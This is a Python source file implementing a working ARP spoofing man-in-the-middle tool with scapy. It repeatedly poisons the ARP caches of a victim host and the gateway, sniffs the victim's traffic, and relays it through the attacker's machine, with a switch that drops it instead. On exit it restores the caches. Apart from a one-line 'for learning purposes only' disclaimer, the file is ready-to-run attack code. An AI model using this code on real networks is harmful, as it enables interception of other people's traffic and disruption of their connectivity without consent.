"""
created by Yoav Kolet
"""

import time
import threading
import scapy.all as scapy
import spoof_tools
from scapy.all import conf, IP, sniff, sendp, Ether, arping

"""
THIS CODE IS FOR LEARNING PURPOSES ONLY!
"""


class ArpSpoofing:
    def __init__(self, victim_ip: str, iface: str = "‏‏Ethernet"):
        """
        :param victim_ip: gets the victim (target) ip
        """
        self.ip = scapy.get_if_addr(conf.iface)
        self.my_mac = spoof_tools.get_mac(self.ip)
        self.victim_ip = victim_ip  # Enter your target IP
        self.victim_mac = spoof_tools.get_mac(self.victim_ip)
        self.gateway_ip = conf.route.route("0.0.0.0")[2]
        self.gateway_mac = spoof_tools.get_mac(self.gateway_ip)
        self.iface = iface
        self.running = True
        self.forward = True

        self.test = None

        self.handle_t = None
        self.run_spoof_t = None

    @staticmethod
    def spoof(victim_ip: str, spoof_ip: str):
        """
        Spoof the ARP cache of a victim IP address with a spoofed IP address.

        :param victim_ip: The IP address of the victim whose ARP cache will be spoofed.
        :type victim_ip: str
        :param spoof_ip: The IP address used for ARP cache spoofing.
        :type spoof_ip: str
        """
        packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=spoof_tools.get_mac(victim_ip), psrc=spoof_ip)
        scapy.send(packet, verbose=False)

    @staticmethod
    def restore(destination_ip, source_ip):
        """
        Restore the ARP cache entry of a destination IP address with its original source IP address.

        :param destination_ip: The IP address whose ARP cache entry will be restored.
        :type destination_ip: str
        :param source_ip: The original IP address used for the ARP cache entry.
        :type source_ip: str
        """
        destination_mac = spoof_tools.get_mac(destination_ip)
        source_mac = spoof_tools.get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, verbose=False)

    def run_spoofer(self):
        """
        Run the ARP spoofer to perform ARP spoofing attack between the victim IP and the gateway IP.
        """
        try:
            # breakpoint()
            sent_packets_count = 0
            while self.running:
                self.spoof(self.victim_ip, self.gateway_ip)
                self.spoof(self.gateway_ip, self.victim_ip)
                sent_packets_count = sent_packets_count + 2
                print("\r[*] Packets Sent " + str(sent_packets_count), end="")
                time.sleep(2)  # Waits for two seconds

        except KeyboardInterrupt:
            self.stop_spoof()

    def stop_spoof(self):
        """
        Stop the ARP spoofing attack and restore ARP tables for the victim IP and the gateway IP.
        """
        self.running = False
        print("\nCtrl + C pressed.............Exiting")
        self.restore(self.gateway_ip, self.victim_ip)
        self.restore(self.victim_ip, self.gateway_ip)
        print("[+] Arp Spoof Stopped")

    def handle_packets(self):
        """
        Sniffs packets on the network interface and filters them using the pack_filter function.
        For each matching packet, it calls the send_packet method.
        """
        try:
            sniff(iface=self.iface, lfilter=self.pack_filter, prn=self.send_packet)
        except OSError:
            print("the iface is incorrect")

    def pack_filter(self, pkt):
        """
        Filters packets based on their MAC addresses.

        :param pkt: The packet to be filtered.
        :type pkt: scapy.packet.Packet

        :return: True if the packet matches the filter criteria, False otherwise.
        :rtype: bool
        """
        return Ether in pkt and IP in pkt and \
            ((pkt[Ether].src == self.victim_mac and pkt[Ether].dst == self.my_mac)
             or
             (pkt[Ether].src == self.gateway_mac and pkt[Ether].dst == self.my_mac))

    def switch_event(self):
        """
        Toggle the ARP spoofing forward flag between True and False.
        """
        if self.forward:
            self.forward = False
        else:
            self.forward = True

    def send_packet(self, pkt):
        """
        Sends a rerouted packet on the Ethernet layer.

        :param pkt: The packet that needs to be rerouted.
        :type pkt: scapy.packet.Packet
        """
        if not self.forward:
            return
        if pkt[Ether].src == self.victim_mac and pkt[Ether].dst == self.my_mac and pkt[IP].src == self.victim_ip:
            pkt[Ether].src = self.my_mac
            pkt[Ether].dst = self.gateway_mac

        elif pkt[Ether].src == self.gateway_mac and pkt[Ether].dst == self.my_mac and pkt[IP].dst == self.victim_ip:
            pkt[Ether].src = self.my_mac
            pkt[Ether].dst = self.victim_mac

        # sends a packet on the Ethernet layer
        sendp(pkt, verbose=False)

    def start_spoof(self):
        """
        Starts the ARP spoofing attack by initiating threads for handling packets and running the spoofer.
        """
        self.handle_t = threading.Thread(target=self.handle_packets)
        self.handle_t.start()
        self.run_spoof_t = threading.Thread(target=self.run_spoofer)
        self.run_spoof_t.start()
